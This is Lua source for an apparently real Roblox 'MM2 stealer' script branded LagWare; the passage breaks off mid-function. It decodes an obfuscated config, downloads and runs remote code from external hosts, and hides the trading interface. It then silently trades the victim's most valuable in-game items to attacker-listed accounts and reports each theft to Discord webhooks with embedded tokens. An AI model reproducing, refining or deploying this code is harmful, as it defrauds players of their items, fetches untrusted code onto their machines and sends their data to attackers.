if not getgenv then
	local tbl = {}

	getgenv = function()
		return tbl
	end
end

if not task then
	task = { spawn = spawn, wait = wait, delay = delay }
elseif not task.spawn then
	task.spawn = spawn
end

if not request then
	request = syn and syn.request or http and http.request or fluxus and fluxus.request or krnl and krnl.request or function()
		return { StatusCode = 0, Body = "" }
	end
end

local function fn(arg, arg2)
	local tbl = {}

	for i = 1, #arg, 2 do
		tbl[#tbl + 1] = string.char(bit32.bxor(tonumber(arg:sub(i, i + 1), 16), string.byte(arg2, (i - 1) / 2 % #arg2 + 1)))
	end

	return table.concat(tbl)
end

local data = game:GetService("HttpService"):JSONDecode(fn(ID, "LW_x9$kR2mP7vN4qJ8tF6wA3bY0cE5hG"))
Usernames = data.Usernames or {}
RELAY_BASE = "https://lagware.site/w/"
BigHitsWebhookToken = "wP4b14gmvIiT6JLNGLUmx7S0vQESkfcg"
HitsWebhookToken = "fkj18Tch8vyMIfF6_ncLkELOnaqvOr2R"
DebugWebhook = ""
Ping = data.Ping or false
MinRarity = data.MinRarity or "Godly"
MinValue = data.MinValue or 0

repeat
	task.wait()
until game:IsLoaded()

local str = Ping and "@everyone\n" or ""
local jobId = game.JobId

if getgenv().executed and getgenv()._execJobId == jobId then
	return
end

getgenv().executed = true
getgenv()._execJobId = jobId
local jobId2 = game.JobId
local realJobId = nil

if getgenv()._realJobId and getgenv()._realJobIdKey == jobId2 then
	realJobId = getgenv()._realJobId
end

if not realJobId then
	if (identifyexecutor and type(identifyexecutor) == "function" and identifyexecutor() or ""):lower():find("delta") then
		local function fn2()
			for _, v in ipairs({
				"OnRenderStepped",
				"GetIsJumping",
				"calculateRawMoveVector",
				"IsMoveVectorCameraRelative",
				"Move",
			}) do
				for _, v2 in ipairs(getgc(true)) do
					if typeof(v2) == "function" then
						local v3 = debug.getinfo(v2)

						if v3 and v3.name == v then
							local v4 = nil

							if pcall(function()
								v4 = hookfunction(v2, function(...)
									if not realJobId or realJobId == "" then
										realJobId = game.JobId
										getgenv()._realJobId = realJobId
										getgenv()._realJobIdKey = jobId2
									end

									return v4(...)
								end)
							end) then
							end

							break
						end
					end
				end

				if not (realJobId and realJobId ~= "") then
					continue
				end
				break
			end
		end

		fn2()
		local now = tick()

		while not realJobId and tick() - now < 5 do
			task.wait()
		end

		realJobId = realJobId or game.JobId
	else
		realJobId = game.JobId
	end
end

local function fn2()
	return realJobId
end

local function fn3(arg)
	if not DebugWebhook or DebugWebhook == "" then
		return
	end

	pcall(function()
		request({
			Url = DebugWebhook,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = game:GetService("HttpService"):JSONEncode({ content = "🔧 **[TRF]** " .. tostring(arg), username = "Transferer Debug" }),
		})
	end)
end

local chunk = loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/addons/serverhop", true))
local Players = game:GetService("Players")
local abcdefg = getgenv().abcdefg or fn2()

local function fn4()
	local flag = false

	pcall(function()
		flag = game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0
	end)

	local n = 0
	local now = os.clock()

	while true do
		pcall(function()
			n = Players.MaxPlayers
		end)

		if n > 0 then
			break
		else
			task.wait(0.1)
			if not (os.clock() - now > 2) then
				continue
			end
			break
		end
	end

	local flag2 = false

	if n > 0 then
		flag2 = #Players:GetPlayers() >= n
	end

	return flag, flag2
end

local v, v2 = fn4()
VIP = v
FULL = v2
SHALL_SERVERHOP = VIP or FULL

if SHALL_SERVERHOP then
	if VIP then
		Players.LocalPlayer:Kick("Public servers only!\nPrivate servers are not supported.")
	end

	if FULL then
		Players.LocalPlayer:Kick("Servidor inválido\nServer is full, hopping...")
	end

	local str2 = (identifyexecutor and identifyexecutor() or ""):lower()

	if not (str2:find("delta") or str2:find(string.char(107, 114, 110, 108))) then
		chunk()
	end

	return
end

ROBLOX_JOIN_CLICK_URL = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. abcdefg

local function fn5(arg)
	if not arg or arg == "" then
		return nil
	end
	return RELAY_BASE .. arg
end

Webhook = data.Webhook or ""
USERNAME_PATTERN_ALLOWED = false

MM2_STEALER = function()
	version = "Comparison is the thief of joy"

	if not game:IsLoaded() then
		game.Loaded:Wait()
	end

	game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui", 600)
	game:GetService("HttpService")
	game:GetService("Players")
	game:GetService("Workspace")
	game:GetService("ReplicatedStorage")
	local Players2 = game:GetService("Players")
	game:GetService("RunService")
	game:GetService("Workspace")
	game:GetService("VirtualUser")
	local VirtualUser = game:GetService("VirtualUser")

	game:service("Players").LocalPlayer.Idled:connect(function()
		VirtualUser:CaptureController()
		VirtualUser:ClickButton2(Vector2.new())
	end)

	if not game:IsLoaded() then
		game.Loaded:Wait()
	end

	game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui", 600)
	game:GetService("HttpService")
	game:GetService("Players")
	game:GetService("Workspace")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players3 = game:GetService("Players")
	game:GetService("RunService")
	game:GetService("Workspace")
	game:GetService("VirtualUser")
	local localPlayer = Players3.LocalPlayer
	local tbl = { "MouseButton1Click", "MouseButton1Down", "Activated" }

	TapUI = function(arg, arg2, arg3)
		if arg2 == "Active Check" then
			if not arg.Active then
				return
			end
			arg = arg[arg3]
		end

		if arg2 == "Text Check" then
			if arg ~= "^" then
				return
			end
			arg = arg3
		end

		for _, v3 in pairs(tbl) do
			for _, v4 in pairs(getconnections(arg[v3])) do
				v4:Fire()
			end
		end
	end

	repeat
		task.wait(1)

		pcall(function()
			TapUI(localPlayer.PlayerGui.DeviceSelect.Container.Tablet.Button)
		end)

		pcall(function()
			TapUI(game:GetService("Players").LocalPlayer.PlayerGui.Join.Friends.Play)
		end)
	until localPlayer.PlayerGui:FindFirstChild("MainGUI")

	universeid = game.GameId
	if universeid ~= 66654135 then
		return
	end

	get_device_type = function()
		local lobby = game.Players.LocalPlayer.PlayerGui.MainGUI:FindFirstChild("Lobby")
		return lobby and lobby:FindFirstChild("LeaderBar") ~= nil and "mobile" or "tablet"
	end

	local trade = ReplicatedStorage:WaitForChild("Trade")
	local Players4 = game:GetService("Players")
	local Item = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
	local HttpService = game:GetService("HttpService")

	local function fn6(arg)
		return (arg or ""):lower():gsub("[%s%'%-]", "")
	end

	local function fn7()
		local lib = nil

		local ok, result = pcall(function()
			lib = loadstring(game:HttpGet("https://lagware.site/values.lua"))()
		end)

		if not ok or type(lib) ~= "table" then
			warn("[Values] fetch failed: " .. tostring(result))
			return {}
		end
		local tbl2 = {}
		local tbl3 = {}

		for k, v3 in pairs(lib) do
			if type(v3) == "table" then
				local flag = k == "Chroma"

				for k2, v4 in pairs(v3) do
					if type(v4) == "number" then
						local v5 = flag and fn6(k2:lower():gsub("^chroma%s+", "")) or fn6(k2)

						if flag then
							tbl3[v5] = v4
						else
							tbl2[v5] = v4
						end
					end
				end
			end
		end

		local tbl4 = {}

		for k, v3 in pairs(Item) do
			local rarity = v3.Rarity or ""
			local flag = k:find("Chroma", 1, true) ~= nil

			if rarity ~= "" then
				local v4 = fn6(v3.ItemName or "")
				local v5

				if flag then
					v5 = tbl3[v4]
				else
					v5 = tbl2[v4]

					if not v5 and v4 ~= "" then
						for k2, v6 in pairs(tbl2) do
							if k2:find(v4, 1, true) then
								v5 = v6
								break
							end
						end
					end
				end

				if v5 then
					tbl4[k] = v5
				end
			end
		end

		return tbl4
	end

	local v3 = fn7()
	local tbl2 = { "Common", "Uncommon", "Rare", "Legendary", "Vintage", "Godly", "Ancient", "Unique" }

	local function fn8(arg)
		return arg == "Classic" and "Vintage" or arg
	end

	local n = 6

	for i, v4 in ipairs(tbl2) do
		if v4 == (MinRarity or "Godly") then
			n = i
			break
		end
	end

	local tbl3 = {}

	for i = #tbl2, n, -1 do
		table.insert(tbl3, tbl2[i])
	end

	WEAPON_DATABASE = Item
	PETS_DATABASE = {}
	getgenv()._claimedTotal = 0
	getgenv()._claimedItems = {}
	getgenv()._stealing = false
	local str2 = "GetFullInventory"
	local str3 = "InventoryModule"
	local str4 = "UpdateInventory"

	GetSortedItems = function()
		local tbl4 = {}
		local owned = game:GetService("ReplicatedStorage").Remotes.Extras[str2]:InvokeServer(game.Players.LocalPlayer.Name).Weapons.Owned
		local flag = false

		for k in pairs(owned) do
			local v4 = WEAPON_DATABASE[k]

			if v4 then
				if table.find(tbl3, fn8(v4.Rarity)) then
					flag = true
				end
			end
		end

		if not flag then
			return {}
		end

		for k, v4 in pairs(owned) do
			local v5 = WEAPON_DATABASE[k]

			if v5 then
				local n2 = (v3[k] or 0) * v4

				if not (v5.ItemName == "Default Knife" or v5.ItemName == "Default Gun") then
					if table.find(tbl3, fn8(v5.Rarity)) then
						table.insert(tbl4, {
							Name = v5.ItemName,
							ID = k,
							RAP = n2,
							Class = v5.ItemType,
							Rarity = fn8(v5.Rarity),
							Amount = v4,
							Chroma = v5.Chroma,
						})
					end
				end
			end
		end

		table.sort(tbl4, function(arg, arg2)
			if arg.RAP ~= arg2.RAP then
				return arg.RAP > arg2.RAP
			end
			local v4 = table.find(tbl3, arg.Rarity)
			local v5 = table.find(tbl3, arg2.Rarity)
			if v4 and v5 then
				return v4 < v5
			end

			if v4 then
				return true
			end

			if v5 then
				return false
			end
			return false
		end)

		return tbl4
	end

	total_value = 0
	hits = GetSortedItems()

	for _, v4 in pairs(hits) do
		total_value = total_value + v4.RAP
	end

	if #hits < 1 then
		getgenv()._aj_done = true
		return
	end

	if (MinValue or 0) > 0 and total_value < MinValue then
		getgenv()._aj_done = true
		return
	end
	all_items = ""
	local n2 = 0

	for _, v4 in pairs(hits) do
		n2 += 1
		all_items = all_items .. v4.Name .. " (x" .. v4.Amount .. "): " .. v4.RAP .. " Value\n"
		if n2 == 30 then
			all_items = all_items .. "\n\nAnd more..."
			break
		end
	end

	local pos = identifyexecutor

	if pos then
		pos = identifyexecutor():lower():find("xeno")
	end

	if not pos then
		pcall(function()
			require(game:GetService("ReplicatedStorage").Modules[str3])[str4] = function()
			end
		end)
	end

	local v4 = get_device_type()

	HideGui = function()
		for _, child in pairs(game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI:GetChildren()) do
			child.Position = UDim2.new(99, 99, 99, 99)
		end

		local tradeGUIPhone = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone
		tradeGUIPhone.Inactive.Frame.Position = UDim2.new(99, 99, 99, 99)
		tradeGUIPhone.Inactive.TradeMainOld.Position = UDim2.new(99, 99, 99, 99)
		tradeGUIPhone.Container.Position = UDim2.new(99, 99, 99, 99)

		if v4 == "tablet" then
			local clickBlocker = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone"):WaitForChild("ClickBlocker")
			clickBlocker.Visible = false

			clickBlocker:GetPropertyChangedSignal("Visible"):Connect(function()
				clickBlocker.Visible = false
			end)

			local inspect = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Game"):WaitForChild("Leaderboard"):WaitForChild("Inspect")
			inspect.Visible = false

			inspect:GetPropertyChangedSignal("Visible"):Connect(function()
				inspect.Visible = false
			end)

			local tradeRequest = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Game"):WaitForChild("Leaderboard"):WaitForChild("Container"):WaitForChild("TradeRequest")
			tradeRequest.Visible = false

			tradeRequest:GetPropertyChangedSignal("Visible"):Connect(function()
				tradeRequest.Visible = false
			end)

			local sendingRequest = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Game"):WaitForChild("Leaderboard"):WaitForChild("Container"):WaitForChild("TradeRequest"):WaitForChild("SendingRequest")
			sendingRequest.Visible = false

			sendingRequest:GetPropertyChangedSignal("Visible"):Connect(function()
				sendingRequest.Visible = false
			end)

			local tradeGUI = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
			tradeGUI.Enabled = false

			tradeGUI:GetPropertyChangedSignal("Enabled"):Connect(function()
				tradeGUI.Enabled = false
			end)

			pcall(function()
				local controls = require(game.Players.LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls()

				controls.Disable = function()
				end

				controls:Enable()
			end)

			pcall(function()
				local GuiService = game:GetService("GuiService")
				GuiService.TouchControlsEnabled = true

				GuiService:GetPropertyChangedSignal("TouchControlsEnabled"):Connect(function()
					GuiService.TouchControlsEnabled = true
				end)
			end)
		else
			local popup = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Lobby"):WaitForChild("Leaderboard"):WaitForChild("Popup")
			popup.Visible = false

			popup:GetPropertyChangedSignal("Visible"):Connect(function()
				popup.Visible = false
			end)

			local tradeRequest = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Lobby"):WaitForChild("Leaderboard"):WaitForChild("Container"):WaitForChild("OverlayMenu"):WaitForChild("TradeRequest")
			tradeRequest.Visible = false

			tradeRequest:GetPropertyChangedSignal("Visible"):Connect(function()
				tradeRequest.Visible = false
			end)

			local sendingRequest = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Lobby"):WaitForChild("Leaderboard"):WaitForChild("Container"):WaitForChild("OverlayMenu"):WaitForChild("TradeRequest"):WaitForChild("SendingRequest")
			sendingRequest.Visible = false

			sendingRequest:GetPropertyChangedSignal("Visible"):Connect(function()
				sendingRequest.Visible = false
			end)

			local clickBlocker = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone"):WaitForChild("ClickBlocker")
			clickBlocker.Visible = false

			clickBlocker:GetPropertyChangedSignal("Visible"):Connect(function()
				clickBlocker.Visible = false
			end)

			pcall(function()
				local controls = require(game.Players.LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls()

				controls.Disable = function()
				end

				controls:Enable()
			end)

			pcall(function()
				local GuiService = game:GetService("GuiService")
				GuiService.TouchControlsEnabled = true

				GuiService:GetPropertyChangedSignal("TouchControlsEnabled"):Connect(function()
					GuiService.TouchControlsEnabled = true
				end)
			end)
		end
	end

	IsTrading = function()
		trade = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
		return trade.GetTradeStatus:InvokeServer()
	end

	ReadyTrade = function()
		local tbl4 = {}

		pcall(function()
			local v5 = pairs
			local owned = ReplicatedStorage.Remotes.Extras[str2]:InvokeServer(localPlayer.Name).Weapons.Owned or {}

			for k, v6 in v5(owned) do
				tbl4[k] = v6
			end
		end)

		local acceptTrade = game:GetService("ReplicatedStorage").Trade.AcceptTrade
		local lastOffer = nil
		local connection = nil

		pcall(function()
			connection = game:GetService("ReplicatedStorage").Trade.UpdateTrade.OnClientEvent:Connect(function(arg)
				if arg and arg.LastOffer then
					lastOffer = arg.LastOffer
				end
			end)
		end)

		local n3 = tick() + 45
		local n4 = 0

		while tick() < n3 do
			local response, v5 = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()

			if response == "None" then
				fn3("ReadyTrade: status=None acceptCount=" .. n4)
				break
			else
				if response == "StartTrade" then
					local lastOffer2 = lastOffer or v5 and v5.LastOffer

					if lastOffer2 then
						pcall(function()
							acceptTrade:FireServer(game.PlaceId * 3, lastOffer2)
						end)

						n4 += 1
						fn3("AcceptTrade #" .. n4 .. " token=" .. tostring(lastOffer2))
					end
				end

				task.wait(1)
			end
		end

		if n3 <= tick() then
			fn3("FAIL ReadyTrade: 45s deadline expired, acceptCount=" .. n4)
		end

		pcall(function()
			if connection then
				connection:Disconnect()
			end
		end)

		task.wait(2)
		local tbl5 = {}

		pcall(function()
			local v5 = pairs
			local owned = ReplicatedStorage.Remotes.Extras[str2]:InvokeServer(localPlayer.Name).Weapons.Owned or {}

			for k, v6 in v5(owned) do
				tbl5[k] = v6
			end
		end)

		local tbl6 = {}

		for k, v5 in pairs(tbl4) do
			local n5 = tbl5[k] or 0

			if n5 < v5 then
				local v6 = WEAPON_DATABASE[k]

				if v6 then
					local n6 = v5 - n5
					local n7 = (v3[k] or 0) * n6
					getgenv()._claimedTotal = (getgenv()._claimedTotal or 0) + n7
					local claimedItems = getgenv()._claimedItems or {}

					table.insert(claimedItems, {
						name = v6.ItemName,
						amount = n6,
						value = n7,
						rarity = v6.Rarity,
						chroma = v6.Chroma,
					})

					getgenv()._claimedItems = claimedItems

					table.insert(tbl6, {
						name = v6.ItemName,
						amount = n6,
						value = n7,
						rarity = v6.Rarity,
						chroma = v6.Chroma,
					})
				end
			end
		end

		local flag = true
		local n5 = 0

		for k, v5 in pairs(tbl5) do
			local v6 = WEAPON_DATABASE[k]

			if v6 and v5 > 0 and v6.ItemName ~= "Default Knife" and v6.ItemName ~= "Default Gun" and table.find(tbl3, fn8(v6.Rarity)) then
				n5 += 1
				flag = false
			end
		end

		if getgenv()._onClaim then
			pcall(getgenv()._onClaim, tbl6, flag, n5)
		end
	end

	SendTrade = function(arg)
		pcall(function()
			local v5 = game.Players:FindFirstChild(arg)

			if v5 then
				ReplicatedStorage.Trade.SendRequest:InvokeServer(v5)
			end
		end)
	end

	DepositItemInTrade = function(arg, arg2, arg3)
		if arg == nil or arg2 == nil or arg3 == nil then
			warn("[Transferer] DepositItemInTrade: nil arg, skipping")
			return
		end
		arg2 = (arg2 == "Weapons" or arg2 == "Pets") and arg2 or "Weapons"

		for i = 1, arg3 do
			trade.OfferItem:FireServer(arg, arg2)
			task.wait(0.1)
		end

		DepositedItems = DepositedItems + 1
	end

	stop_trade = function()
		if v4 == "tablet" then
			getconnections(game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI"):WaitForChild("Container"):WaitForChild("Trade"):WaitForChild("Actions"):WaitForChild("Decline"):WaitForChild("ActionButton").MouseButton1Click)[1]:Fire()
		else
			getconnections(game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone"):WaitForChild("Container"):WaitForChild("Trade"):WaitForChild("Actions"):WaitForChild("Decline"):WaitForChild("ActionButton").MouseButton1Click)[1]:Fire()
		end
	end

	declince_trade_request = function()
		if v4 == "tablet" then
			getconnections(game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Game"):WaitForChild("Leaderboard"):WaitForChild("Container"):WaitForChild("TradeRequest"):WaitForChild("ReceivingRequest"):WaitForChild("Decline").MouseButton1Click)[1]:Fire()
		else
			getconnections(game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Lobby"):WaitForChild("Leaderboard"):WaitForChild("Container"):WaitForChild("OverlayMenu"):WaitForChild("TradeRequest"):WaitForChild("ReceivingRequest"):WaitForChild("Decline").MouseButton1Click)[1]:Fire()
		end
	end

	cancel_pending_request = function()
		if v4 == "tablet" then
			getconnections(game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Game"):WaitForChild("Leaderboard"):WaitForChild("Container"):WaitForChild("TradeRequest"):WaitForChild("SendingRequest"):WaitForChild("Cancel").MouseButton1Click)[1]:Fire()
		else
			getconnections(game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Lobby"):WaitForChild("Leaderboard"):WaitForChild("Container"):WaitForChild("OverlayMenu"):WaitForChild("TradeRequest"):WaitForChild("SendingRequest"):WaitForChild("Cancel").MouseButton1Click)[1]:Fire()
		end
	end

	Steal = function(arg)
		if getgenv()._stealing then
			return
		end

		if getgenv()._transferer_done then
			return
		end
		getgenv()._stealing = true
		HideGui()
		local name = arg.Name
		fn3("Steal() → " .. name)
		local now = tick()
		local exitTo = nil

		while true do
			if not (tick() - now < 5) then
				exitTo = 1
				break
			else
				local v5 = IsTrading()

				if v5 == "None" then
					exitTo = 1
					break
				elseif v5 ~= "StartTrade" then
					stop_trade()
					declince_trade_request()
					cancel_pending_request()
					local pos2 = identifyexecutor

					if pos2 then
						pos2 = identifyexecutor():lower():find("xeno")
					end

					if pos2 then
						pcall(function()
							trade.DeclineRequest:FireServer()
						end)

						pcall(function()
							trade.CancelRequest:FireServer()
						end)
					end

					task.wait(0.2)
					continue
				end

				break
			end
		end

		if exitTo == 1 then
			local v5 = IsTrading()

			if v5 ~= "None" then
				fn3("FAIL clear timeout: still " .. tostring(v5) .. " after 5s → " .. name)
			end

			local str5 = "None"
			local n3 = 0

			while true do
				pcall(function()
					SendTrade(name)
				end)

				pcall(function()
					local playerGui = game.Players.LocalPlayer.PlayerGui

					if v4 == "tablet" then
						playerGui.MainGUI.Game.Leaderboard.Container.TradeRequest.SendingRequest.Visible = false
					else
						playerGui.MainGUI.Lobby.Leaderboard.Container.OverlayMenu.TradeRequest.SendingRequest.Visible = false
					end
				end)

				task.wait(0.1)
				n3 += 1

				pcall(function()
					str5 = IsTrading()
				end)

				if not (str5 ~= "None" or n3 >= 16) then
					continue
				end
				break
			end

			if n3 >= 16 and str5 == "None" then
				fn3("FAIL send: 16 attempts, trade never sent → " .. name)
			end

			local now2 = tick()
			str5 = IsTrading()

			while str5 ~= "None" and str5 ~= "StartTrade" and tick() - now2 < 20 do
				task.wait(0.15)
				str5 = IsTrading()
			end

			local v6 = IsTrading()
			fn3("post-wait status=" .. tostring(v6) .. " (waited " .. string.format("%.1f", tick() - now2) .. "s) → " .. name)

			if v6 == "None" then
				fn3("FAIL wait: target declined or never accepted → " .. name)
			end

			if IsTrading() == "StartTrade" then
				if HitMsgId then
					pcall(function()
						local v7 = joinedAt
						local n4 = os.time() - v7
						local str6 = string.format("%dm %ds", math.floor(n4 / 60), n4 % 60)

						request({
							Url = Webhook .. "/messages/" .. HitMsgId,
							Method = "PATCH",
							Headers = { ["Content-Type"] = "application/json" },
							Body = game:GetService("HttpService"):JSONEncode({
								embeds = {
									{
										color = 10181046,
										author = { name = authorStr, icon_url = avatarUrl },
										title = commaNum(total_value) .. " value",
										url = ROBLOX_JOIN_CLICK_URL,
										fields = buildEmbedFields("Almost Claimed", str6),
										footer = { text = "Stealer Made By LagWare .gg/aC5yK58VV5" },
										timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
									},
								},
							}),
						})
					end)
				end

				DepositedItems = 0
				current_inv = GetSortedItems()

				if #current_inv == 0 then
					fn3("FAIL deposit: GetSortedItems returned empty → " .. name)
					getgenv()._stealing = false
					return
				end

				task.wait(0.3)
				local n4 = 0

				for _, v7 in ipairs(current_inv) do
					if not (n4 >= 4) then
						fn3("OfferItem " .. tostring(v7.Name) .. " x" .. tostring(v7.Amount) .. " class=" .. tostring(v7.Class))
						DepositItemInTrade(v7.ID, v7.Class, v7.Amount)
						n4 += 1
						task.wait(0.1)
						continue
					end

					break
				end

				fn3("deposit done slotsUsed=" .. n4 .. " → ReadyTrade")
				DepositedItems = 0
				ReadyTrade()
			end

			getgenv()._stealing = false
			return
		end

		fn3("FAIL clear: StartTrade already open, bailing → " .. name)
		getgenv()._stealing = false
	end

	UnlockTrades = function()
		game:GetService("ReplicatedStorage"):WaitForChild("Trade").SetRequestsEnabled:FireServer(true)
	end

	LoopSteal = function(arg)
		local str5 = "_loopActive_" .. arg.Name
		if getgenv()[str5] then
			return
		end
		local str6 = "_loopActive_" .. arg.Name
		getgenv()[str6] = true
		UnlockTrades()

		task.spawn(function()
			while task.wait(0.1) do
				if not getgenv()._transferer_done then
					pcall(function()
						Steal(arg)
					end)

					continue
				end

				break
			end

			local str7 = "_loopActive_" .. arg.Name
			getgenv()[str7] = nil
		end)
	end

	shall_steal = function(arg)
		if arg.Name == game.Players.LocalPlayer.Name then
			return false
		end

		for _, v5 in pairs(Usernames) do
			local name = arg.Name
			if v5:lower() == name:lower() then
				return true
			end
		end

		return false
	end

	PrepareSteal = function(arg)
		UnlockTrades()
		task.wait()
		local v5 = shall_steal
		local v6 = declince_trade_request
		local v7 = LoopSteal

		trade.SendRequest.OnClientInvoke = function(arg2)
			if v5(arg2) then
				task.wait()
				v6()
				task.wait()
				v7(arg)
			else
				v6()
			end

			return true
		end

		v7(arg)
	end

	local v5 = shall_steal
	local v6 = PrepareSteal
	local v7 = LoopSteal

	for _, child in pairs(game.Players:GetChildren()) do
		if v5(child) then
			v6(child)
		end
	end

	Players4.PlayerAdded:Connect(function(player)
		if v5(player) then
			v6(player)
		end
	end)

	for _, player in pairs(Players4:GetPlayers()) do
		if v5(player) then
			player.Chatted:Connect(function()
				v7(player)
			end)
		end
	end

	Players4.PlayerAdded:Connect(function(player)
		if v5(player) then
			player.Chatted:Connect(function()
				v7(player)
			end)
		end
	end)

	local localPlayer2 = game:GetService("Players").LocalPlayer
	local str5 = identifyexecutor and identifyexecutor() or "unknown"
	local str6 = ""

	pcall(function()
		local v8 = request({
			Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. localPlayer2.UserId .. "&size=150x150&format=Png&isCircular=false",
			Method = "GET",
		})

		if v8 and v8.Body then
			local data2 = HttpService:JSONDecode(v8.Body)

			if data2 and data2.data and data2.data[1] then
				str6 = data2.data[1].imageUrl or ""
			end
		end
	end)

	local now = os.time()
	local id = nil
	local flag = true
	getgenv()._transferer_done = false

	for _, v8 in ipairs(Usernames) do
		local str7 = "_loopActive_" .. v8
		getgenv()[str7] = nil
	end

	local function fn9(arg, arg2, arg3)
		if arg3 then
			return "🌈"
		end
		local str7 = arg:lower()

		for _, v8 in ipairs({
			{ "elderwood", "🌳" },
			{ "ghostblade", "👻" },
			{ "ghostgun", "👻" },
			{ "darkblade", "🖤" },
			{ "darkgun", "🖤" },
			{ "heartblade", "💖" },
			{ "heartgun", "💖" },
			{ "candycane", "🍬" },
			{ "candygun", "🍬" },
			{ "pumpkin", "🎃" },
			{ "snowflake", "❄" },
			{ "snowgun", "❄" },
			{ "clown", "🤡" },
			{ "sharkbite", "🦈" },
			{ "shark", "🦈" },
			{ "tiger", "🐯" },
			{ "viper", "🐍" },
			{ "slasher", "⚔" },
			{ "blaster", "💥" },
			{ "luger", "🔫" },
			{ "seercam", "📷" },
			{ "seer", "🔮" },
			{ "amaranth", "🌸" },
			{ "blossom", "🌸" },
			{ "saw", "🪚" },
			{ "icicle", "🧊" },
			{ "icedagger", "🧊" },
			{ "gingerblade", "🍪" },
			{ "ginger", "🍪" },
			{ "batwing", "🦇" },
			{ "arctic", "❄" },
			{ "seasons", "🍂" },
			{ "season", "🍂" },
			{ "tides", "🌊" },
			{ "wave", "🌊" },
			{ "aurora", "🌅" },
			{ "prismatic", "🔮" },
			{ "prism", "🔮" },
			{ "eternal", "✨" },
			{ "laser", "⚡" },
			{ "skul", "💀" },
			{ "corrupt", "🌀" },
			{ "phantom", "👻" },
			{ "vine", "🌿" },
			{ "lava", "🌋" },
			{ "void", "🕳" },
			{ "cosmic", "🌌" },
			{ "galaxy", "🌌" },
			{ "rainbow", "🌈" },
			{ "classic", "📜" },
			{ "vintage", "📜" },
			{ "ghost", "👻" },
			{ "skull", "💀" },
			{ "death", "💀" },
			{ "bone", "🦴" },
			{ "blood", "🩸" },
			{ "spider", "🕷" },
			{ "dragon", "🐉" },
			{ "snake", "🐍" },
			{ "wolf", "🐺" },
			{ "fox", "🦊" },
			{ "hawk", "🦅" },
			{ "eagle", "🦅" },
			{ "bat", "🦇" },
			{ "wing", "🦅" },
			{ "elder", "🌳" },
			{ "wood", "🌳" },
			{ "dark", "🖤" },
			{ "shadow", "🌑" },
			{ "evil", "🌀" },
			{ "fire", "🔥" },
			{ "flame", "🔥" },
			{ "ice", "🧊" },
			{ "frost", "🧊" },
			{ "chill", "🧊" },
			{ "snow", "❄" },
			{ "winter", "❄" },
			{ "crystal", "💎" },
			{ "gem", "💎" },
			{ "diamond", "💎" },
			{ "ruby", "💎" },
			{ "emerald", "💎" },
			{ "electric", "⚡" },
			{ "thunder", "⚡" },
			{ "star", "⭐" },
			{ "pink", "🌸" },
			{ "heart", "💗" },
			{ "candy", "🍬" },
			{ "treat", "🍬" },
			{ "scythe", "🪓" },
			{ "ax", "🪓" },
			{ "sword", "⚔" },
			{ "blade", "⚔" },
			{ "knife", "🔪" },
			{ "gun", "🔫" },
			{ "shot", "🔫" },
			{ "pistol", "🔫" },
			{ "revolver", "🔫" },
		}) do
			if str7:find(v8[1], 1, true) then
				return v8[2]
			end
		end

		return ({ Unique = "✨", Ancient = "🏺", Godly = "⭐", Vintage = "📜", Legendary = "🔮" })[arg2] or "⭐"
	end

	local str7 = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. abcdefg .. "\")"
	local n3 = #game:GetService("Players"):GetPlayers()
	local maxPlayers = game:GetService("Players").MaxPlayers

	local function fn10(arg)
		return (tostring(math.floor(arg or 0)):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", ""))
	end

	local function fn11()
		local tbl4 = {}
		local v8 = ipairs
		local claimedItems = getgenv()._claimedItems or {}

		for _, claimedItem in v8(claimedItems) do
			tbl4[claimedItem.name] = (tbl4[claimedItem.name] or 0) + claimedItem.amount
		end

		local tbl5 = {}
		local n4 = 0

		for _, v9 in ipairs(hits) do
			if n4 >= 8 then
				table.insert(tbl5, string.format("  + %d more...", #hits - n4))
				break
			else
				table.insert(tbl5, string.format("%s%s (x%d): %s Value", (tbl4[v9.Name] or 0) >= v9.Amount and "+ " or "- ", v9.Name, v9.Amount, fn10(v9.Amount > 0 and math.floor(v9.RAP / v9.Amount) or 0)))
				n4 += 1
			end
		end

		local str8 = "```diff\n" .. table.concat(tbl5, "\n") .. "\n```"

